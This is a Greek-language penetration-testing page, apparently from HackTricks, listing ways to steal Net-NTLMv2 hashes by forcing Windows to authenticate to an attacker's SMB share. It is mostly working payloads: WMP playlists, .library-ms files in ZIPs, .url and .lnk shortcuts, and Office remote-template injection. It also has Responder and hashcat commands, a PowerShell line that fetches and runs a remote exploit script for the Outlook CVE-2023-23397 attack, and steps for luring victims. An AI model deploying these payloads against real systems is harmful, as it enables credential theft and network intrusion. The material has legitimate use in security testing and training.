# Τοποθεσίες για να κλέψετε NTLM creds

{{#include ../../banners/hacktricks-training.md}}

**Δείτε όλες τις εξαιρετικές ιδέες από [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) — από το κατέβασμα ενός Microsoft Word αρχείου online μέχρι την πηγή ntlm leaks: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md και [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**


### Windows Media Player λίστες αναπαραγωγής (.ASX/.WAX)

Αν καταφέρεις να πείσεις έναν στόχο να ανοίξει ή να προεπισκοπήσει μια Windows Media Player playlist που ελέγχεις, μπορείς να leak Net‑NTLMv2 δείχνοντας την καταχώρηση σε ένα UNC path. Το WMP θα προσπαθήσει να προσπελάσει τα αναφερόμενα μέσα μέσω SMB και θα αυθεντικοποιηθεί αυτόματα.

Παράδειγμα payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Ροή συλλογής και cracking:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP-embedded .library-ms NTLM leak (CVE-2025-24071/24055)

Το Windows Explorer χειρίζεται ανασφαλώς αρχεία .library-ms όταν ανοίγονται απευθείας μέσα από ένα αρχείο ZIP. Αν ο ορισμός της βιβλιοθήκης δείχνει σε ένα απομακρυσμένο UNC path (π.χ., \\attacker\share), απλώς η περιήγηση/εκκίνηση του .library-ms μέσα στο ZIP προκαλεί στο Explorer να κάνει enumerate το UNC και να εκπέμψει NTLM authentication στον attacker. Αυτό αποδίδει ένα NetNTLMv2 που μπορεί να σπάσει offline ή ενδεχομένως να γίνει relay.

Ελάχιστο δείγμα .library-ms που δείχνει σε attacker UNC
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Βήματα λειτουργίας
- Δημιουργήστε το αρχείο .library-ms με το παραπάνω XML (ορίστε το IP/hostname).
- Συμπιέστε το (σε Windows: Send to → Compressed (zipped) folder) και παραδώστε το ZIP στον στόχο.
- Εκτελέστε έναν NTLM capture listener και περιμένετε το θύμα να ανοίξει το .library-ms από μέσα στο ZIP.


### Outlook calendar reminder sound path (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak

Το Microsoft Outlook for Windows επεξεργαζόταν την εκτεταμένη ιδιότητα MAPI PidLidReminderFileParameter σε στοιχεία ημερολογίου. Αν αυτή η ιδιότητα δείχνει σε UNC path (π.χ., \\attacker\share\alert.wav), το Outlook θα επικοινωνούσε με το SMB share όταν ενεργοποιηθεί η υπενθύμιση, leaking τα Net‑NTLMv2 του χρήστη χωρίς κανένα κλικ. Αυτό επιδιορθώθηκε στις 14 Μαρτίου 2023, αλλά παραμένει ιδιαίτερα σχετικό για legacy/untouched fleets και για ιστορική incident response.

Γρήγορη εκμετάλλευση με PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Πλευρά Listener:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Σημειώσεις
- Το θύμα χρειάζεται μόνο το Outlook for Windows να τρέχει όταν ενεργοποιηθεί η υπενθύμιση.
- Το leak αποδίδει Net‑NTLMv2 κατάλληλο για offline cracking ή relay (όχι pass‑the‑hash).


### .LNK/.URL icon-based zero‑click NTLM leak (CVE‑2025‑50154 – bypass of CVE‑2025‑24054)

Το Windows Explorer αποδίδει shortcut icons αυτόματα. Πρόσφατη έρευνα έδειξε ότι ακόμη και μετά το Microsoft’s April 2025 patch for UNC‑icon shortcuts, ήταν ακόμα δυνατό να ενεργοποιηθεί NTLM authentication χωρίς κλικ, φιλοξενώντας τον στόχο της συντόμευσης σε UNC path και κρατώντας το icon local (patch bypass assigned CVE‑2025‑50154). Η απλή προβολή του φακέλου αναγκάζει το Explorer να ανακτήσει metadata από τον remote target, εκπέμποντας NTLM στον attacker SMB server.

Ελάχιστο Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
Payload συντόμευσης προγράμματος (.lnk) μέσω PowerShell:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Ιδέες παράδοσης
- Τοποθετήστε το shortcut σε ένα ZIP και πείστε το θύμα να το περιηγηθεί.
- Τοποθετήστε το shortcut σε ένα εγγράψιμο share που θα ανοίξει το θύμα.
- Συνδυάστε με άλλα lure files στον ίδιο φάκελο ώστε το Explorer να προεπισκοπεί τα στοιχεία.


### Office remote template injection (.docx/.dotm) to coerce NTLM

Τα Office documents μπορούν να αναφέρονται σε ένα εξωτερικό template. Εάν ορίσετε το επισυναπτόμενο template σε μια UNC διαδρομή, το άνοιγμα του εγγράφου θα κάνει authentication σε SMB.

Ελάχιστες αλλαγές στις σχέσεις DOCX (inside word/):

1) Επεξεργαστείτε το word/settings.xml και προσθέστε την αναφορά προτύπου που επισυνάπτεται:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) Επεξεργαστείτε το word/_rels/settings.xml.rels και δείξτε το rId1337 στο UNC σας:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) Επανασυσκευάστε σε .docx και παραδώστε. Τρέξτε τον SMB capture listener σας και περιμένετε το άνοιγμα.

Για ιδέες μετά την καταγραφή (post-capture) σχετικά με relaying ή abusing του NTLM, δείτε:

{{#ref}}
README.md
{{#endref}}


## Αναφορές
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)


{{#include ../../banners/hacktricks-training.md}}
